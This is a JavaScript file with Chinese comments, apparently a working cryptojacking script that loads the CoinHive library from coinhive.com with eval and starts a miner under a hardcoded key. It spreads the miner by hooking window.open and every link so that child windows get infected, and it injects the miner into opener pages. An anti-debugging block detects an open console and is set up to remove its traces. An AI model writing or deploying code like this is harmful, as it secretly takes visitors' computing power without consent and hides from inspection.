//tips：修改代码时需要修改三处调用：父页面的注入，子页面的注入，当前页面的调用


window.miner = {};

/*************************

5、反调试模块

**************************/
window.miner.clear = (function(c){
	c.localStorage.setItem("48kqFArmn6fIizVO","1");		//设置debug标志位
	delete c.CoinHive;
	delete c.miner;
	var e = c.document.getElementById("lxraa");				//清理node
	e.parentNode.removeChild(e);
	c.console.clear();
});


(function () {						//检查是否打开了console
	var re = /x/;
	var i =0;
	re.toString = function () {
		i=i+1;
		if(i>1){
			// window.miner.clear(window);
			alert("clear");
		}
		return navigator.userAgent;
	};
	console.log(re);
})();


// window.miner.pDebugger = function(c){							//检查是否打开了console
// 	var re = /x/;
// 	re.toString = function () {
// 		i=i+1;
// 		if(i>1){
// 			alert("console opened");	//i>=2时console被打开，需要进入反调试流程
// 		}
// 		return "console";
// 	};
// 	console.log(re);
// }


/*************************

2、插入挖矿脚本

**************************/

window.miner.doo = (function(c){
	c.miner.x = new c.XMLHttpRequest();
	c.miner.x.onreadystatechange = function(){
		if(c.miner.x.readyState == 4 && c.miner.x.status == 200){
			c.eval(c.miner.x.responseText);
			c.miner.CoinHive = c.CoinHive;
			c.miner.m = new c.miner.CoinHive.Anonymous("hHsRjaE8oBVv8edpubwHE1u3SHLTXjV4", {throttle: 0.8});
			c.miner.m.start();
			c.console.log("ok");
		}
	}

	c.miner.x.open("GET","https://coinhive.com/lib/coinhive.min.js");
	c.miner.x.send();
});

	

/*************************

4、hook所有A标签，控制打开的页面

**************************/
window.miner.hAtag = (function(c){
	c.miner.list = c.document.getElementsByTagName("a");
	for(var i=0;i<c.miner.list.length;i++){
		if(c.miner.list[i].href.match(/^[http|https](.*)/)){
			var h = c.miner.list[i].href;
			// c.miner.list[i].href = "javascript:void(0)";
			// c.miner.list[i].onclick = function(){c.open(h);}
			c.miner.list[i].onclick = (function(h){						//闭包，修复覆盖问题
				return function(){c.open(h,"newWindow"); return false;}	//return false取消默认动作
			})(h);	
		}
	}
});
/*************************

1、hook window.open ，感染用open方法打开的window

**************************/

window.miner.hOpen = (function(c){
	c._open = c.open;									
	c.open = function(){
		c.t = c._open.apply(this,arguments);		//拿到子页面句柄
													//等子页面加载完毕，感染子页面
		c.t.onload = function(){
			c.t.miner = {};
			c.t.miner.doo = c.miner.doo;
			c.t.miner.hOpen = c.miner.hOpen;
			c.t.miner.hAtag = c.miner.hAtag;				
			// c.t.miner.pDebugger = c.miner.pDebugger;

			c.t.miner.doo(c.t);
			c.t.miner.hOpen(c.t);va
			c.t.miner.hAtag(c.t);
			// c.t.miner.pDebugger(c.t);
		}	
			

		return c.t;
	}
});
	

window.miner.doo(window);
window.miner.hOpen(window);
// window.miner.pDebugger(window);
window.miner.hAtag(window);

	// var fetch = window.fetch||fetch;						fetch版本	当前版本为了兼容，使用xmlHttpRequest
	// fetch("https://coinhive.com/lib/coinhive.min.js").then(function(r){return r.text()}).then(function(d){
	// 	eval(d);
	// 	var m = new CoinHive.Anonymous("hHsRjaE8oBVv8edpubwHE1u3SHLTXjV4", {throttle: 0.5});
	// 	m.start();
	// });
/*************************

3、往opener注入脚本,父页面不可能增加，因此注入一次即可

**************************/
var t2 = window;						//往opener回溯，注入代码
while(t2.opener!=null){
	t2 = t2.opener;
	try{
		if(t2.miner == null){
			t2.miner = {};
			t2.miner.doo = window.miner.doo;
			t2.miner.hOpen = window.miner.hOpen;
			t2.miner.hAtag = window.miner.hAtag;
			// t2.miner.pDebugger = window.miner.pDebugger;

			t2.miner.doo(t2);	
			t2.miner.hOpen(t2);
			t2.miner.hAtag(t2);
			// t2.miner.pDebugger(t2);
		}
	}
	catch(e){
		continue;
	}
}
